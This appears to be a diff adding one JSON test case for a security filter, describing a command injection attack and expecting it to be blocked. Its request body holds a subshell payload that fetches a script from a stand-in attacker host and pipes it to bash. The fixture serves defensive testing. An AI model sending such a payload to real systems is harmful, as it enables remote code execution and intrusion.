@@ -1,0 +1,16 @@
+{
+  "id": "attack_010",
+  "name": "Command Injection via Subshell Expansion",
+  "author": "contail",
+  "date": "2026-03-06",
+  "category": "command_injection",
+  "target": "stage1",
+  "attack": {
+    "method": "POST",
+    "path": "/api/query",
+    "headers": {"Content-Type": "application/json"},
+    "body": "{\"query\": \"$(curl http://evil.com/shell.sh | bash)\"}"
+  },
+  "why_dangerous": "Shell subshell expansion $() executes arbitrary commands. Downloads and runs remote script.",
+  "expected_action": "block"
+}
